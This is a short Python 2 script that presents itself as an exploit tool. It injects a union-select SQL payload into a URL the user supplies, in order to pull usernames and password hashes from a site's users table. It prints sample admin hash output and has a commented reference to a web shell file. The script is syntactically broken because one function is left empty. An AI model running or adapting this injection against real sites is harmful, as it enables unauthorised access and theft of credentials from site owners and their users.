import requests,sys,os,bs4,time
import random
if sys.platform == "linux2" or sys.platform == "linux":
 MT = "\033[31;1m"
 MG = "\033[31;2m"
 C = "\033[0m"
 BG = "\033[37;7;1m"
 Y = "\033[33;1;3m"
 H = "\033[32;1m"
 W = "\033[37;1m"
 U = "\033[4m"
 os.system("clear")
elif sys.platform == "win32" or sys.platform == "win64":
 os.system("cls")
else:
 os.system("clear")

def start( site ):
 try:
  exploits="'union select /*!50000Concat*/(username,0x20,password)+from+users--+--+"
 # exploits="indoxploit.php"
  target=site%(str(exploits))
  print("(*) Adding exploits to : %s"%site.replace("%s",""))
  print("(*) Exploits : 'union select /*!50000Concat*/(username,0x20,password)+from+users--+--+")
  time.sleep(2)
  print("(*) Exploits success added")
  time.sleep(1)
  if ("http://") in site:
   try:
    r=requests.get(target)
    html=bs4.BeautifulSoup( r.text,"html5lib" )
    print("(*) Result : {}".format(str(html.title.text)))
    print("(*) If vuln : admin 21232f297a57a5a743894a0e4a801fc3")
    print("(*) Or another username")
   except requests.exceptions.ConnectionError:
    print("(!) Internet Connection Error")
    exit()
  else:
   try:
    r=requests.get(target)
    html=bs4.BeautifulSoup( r.text ,"html5lib")
    print("(*) Result : {}".format(str(html.title.text)))
    print("(*) If vuln : admin 21232f297a57a5a743894a0e4a801fc3")
    print("(*) Or another username")
   except requests.exceptions.ConnectionError:
    print("(!) Internet Connection Error")
    exit()

 except EOFError:
 # print("(*) "+str(a))
  exit()

def main():
 try:
  print("(*) Usage : http://site.co.li/statis-2-%spengantar.html")
  cmd = raw_input("(*)_> ")
  if cmd.lower() == "":
   print("(!} Don't leave blank")
   exit()
  else:
   start( str( cmd ))
 except KeyboardInterrupt:
  print("(!) KeyboardInterrupt ")
  exit()
 except EOFError:
  print("(!) Exiting ")
  exit()
  
def proxy():
 ##disabled
  


if __name__ == "__main__":
 main()